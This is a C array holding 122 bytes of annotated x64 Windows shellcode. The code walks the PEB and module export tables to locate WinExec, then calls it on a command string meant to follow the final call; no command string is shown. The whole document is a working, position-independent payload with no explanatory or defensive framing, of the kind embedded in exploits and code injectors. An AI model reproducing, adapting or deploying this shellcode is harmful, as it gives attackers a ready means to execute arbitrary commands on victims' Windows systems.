
#define EXEC_X64_SIZE 122

char EXEC_X64[] = {
  /* 0000 */ "\x53"                         /* push rbx                        */
  /* 0001 */ "\x57"                         /* push rdi                        */
  /* 0002 */ "\x56"                         /* push rsi                        */
  /* 0003 */ "\x55"                         /* push rbp                        */
  /* 0004 */ "\x48\x83\xec\x28"             /* sub rsp, 0x28                   */
  /* 0008 */ "\x6a\x60"                     /* push 0x60                       */
  /* 000A */ "\x5a"                         /* pop rdx                         */
  /* 000B */ "\xeb\x68"                     /* jmp 0x75                        */
  /* 000D */ "\x65\x48\x8b\x02"             /* mov rax, [gs:rdx]               */
  /* 0011 */ "\x48\x8b\x40\x18"             /* mov rax, [rax+0x18]             */
  /* 0015 */ "\x48\x8b\x78\x10"             /* mov rdi, [rax+0x10]             */
  /* 0019 */ "\xeb\x03"                     /* jmp 0x1e                        */
  /* 001B */ "\x48\x8b\x3f"                 /* mov rdi, [rdi]                  */
  /* 001E */ "\x48\x8b\x5f\x30"             /* mov rbx, [rdi+0x30]             */
  /* 0022 */ "\x8b\x43\x3c"                 /* mov eax, [rbx+0x3c]             */
  /* 0025 */ "\x83\xc0\x60"                 /* add eax, 0x60                   */
  /* 0028 */ "\x8b\x4c\x03\x28"             /* mov ecx, [rbx+rax+0x28]         */
  /* 002C */ "\x67\xe3\xec"                 /* jecxz 0x1b                      */
  /* 002F */ "\x48\x8d\x74\x0b\x18"         /* lea rsi, [rbx+rcx+0x18]         */
  /* 0034 */ "\xad"                         /* lodsd                           */
  /* 0035 */ "\x91"                         /* xchg ecx, eax                   */
  /* 0036 */ "\x67\xe3\xe2"                 /* jecxz 0x1b                      */
  /* 0039 */ "\x57"                         /* push rdi                        */
  /* 003A */ "\xad"                         /* lodsd                           */
  /* 003B */ "\x48\x01\xd8"                 /* add rax, rbx                    */
  /* 003E */ "\x50"                         /* push rax                        */
  /* 003F */ "\xad"                         /* lodsd                           */
  /* 0040 */ "\x48\x01\xd8"                 /* add rax, rbx                    */
  /* 0043 */ "\x48\x97"                     /* xchg rdi, rax                   */
  /* 0045 */ "\xad"                         /* lodsd                           */
  /* 0046 */ "\x48\x01\xd8"                 /* add rax, rbx                    */
  /* 0049 */ "\x50"                         /* push rax                        */
  /* 004A */ "\x8b\x74\x8f\xfc"             /* mov esi, [rdi+rcx*4-0x4]        */
  /* 004E */ "\x81\x3c\x1e\x57\x69\x6e\x45" /* cmp dword [rsi+rbx], 0x456e6957 */
  /* 0055 */ "\xe0\xf3"                     /* loopne 0x4a                     */
  /* 0057 */ "\x5a"                         /* pop rdx                         */
  /* 0058 */ "\x5e"                         /* pop rsi                         */
  /* 0059 */ "\x5f"                         /* pop rdi                         */
  /* 005A */ "\x75\xbf"                     /* jnz 0x1b                        */
  /* 005C */ "\x0f\xb7\x04\x4a"             /* movzx eax, word [rdx+rcx*2]     */
  /* 0060 */ "\x8b\x0c\x86"                 /* mov ecx, [rsi+rax*4]            */
  /* 0063 */ "\x48\x01\xcb"                 /* add rbx, rcx                    */
  /* 0066 */ "\x59"                         /* pop rcx                         */
  /* 0067 */ "\x6a\x01"                     /* push 0x1                        */
  /* 0069 */ "\x5a"                         /* pop rdx                         */
  /* 006A */ "\xff\xd3"                     /* call rbx                        */
  /* 006C */ "\x48\x83\xc4\x28"             /* add rsp, 0x28                   */
  /* 0070 */ "\x5d"                         /* pop rbp                         */
  /* 0071 */ "\x5e"                         /* pop rsi                         */
  /* 0072 */ "\x5f"                         /* pop rdi                         */
  /* 0073 */ "\x5b"                         /* pop rbx                         */
  /* 0074 */ "\xc3"                         /* ret                             */
  /* 0075 */ "\xe8\x93\xff\xff\xff"         /* call 0xd                        */
};